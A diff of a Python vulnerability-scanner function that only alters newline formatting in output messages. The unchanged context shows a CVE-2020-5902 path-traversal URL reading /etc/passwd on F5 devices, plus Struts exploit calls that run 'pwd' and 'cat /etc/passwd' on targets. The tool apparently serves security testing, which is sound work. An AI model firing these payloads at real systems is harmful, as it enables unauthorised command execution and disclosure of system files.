@@ -20,7 +20,7 @@ def cves_check(url,port_num):
                 if "setsessiondata" in response.content.__str__().lower(): 
                     print(colored("\tRechecking responses: HOST VULNERRABLE\n","red"))
         else:
-            print(colored("\tNot Vulnerable\n" ,"white"))
+            print(colored("\tNot Vulnerable" ,"white"))
     except Exception as e:
         if "aborted" in str(e):
             print(colored("\tConnection Aborted by Server. Considering Not Vulnerable\n" ,"white"))
@@ -38,7 +38,7 @@ def cves_check(url,port_num):
     for line in output.splitlines():
         if "allow" in line or "Allow" in line:
             print("\tMethods Server " + line )
-    print(colored("\tNot Vulnerable to Options Bleed.\n", "white"))
+    print(colored("\tNot Vulnerable to Options Bleed.", "white"))
 
 
     print(colored("Scanning For CVE-2020-5902", "green"))
@@ -50,9 +50,8 @@ def cves_check(url,port_num):
                 print(colored("\tVulnerable to CVE-2020-5902 CRITICAL ISSUE. \n Please find the Vulnerable URL below \n\thttps://" + url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "red"))
             else:
                 print(colored("\tUnable to verify if host vulnerable or not. \n\tPlease open below URL manually to verify.\n\thttps://" + url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "white"))
-            print("\n")
         else:
-            print(colored("\tNot Vulnerable to CVE-2020-5902\n", "white"))
+            print(colored("\tNot Vulnerable to CVE-2020-5902", "white"))
     except:
         pass
 
@@ -60,7 +59,6 @@ def cves_check(url,port_num):
     try:
         struts1.exploit(url+ ":" + port_num ,"pwd")
         struts2.exploit(url+ ":" + port_num , "cat /etc/passwd")
-        print("\n")
     except Exception as e:
         print("Exception occured when Checking for checking installation for Struts.")
         print("ERROR: " + str(e))
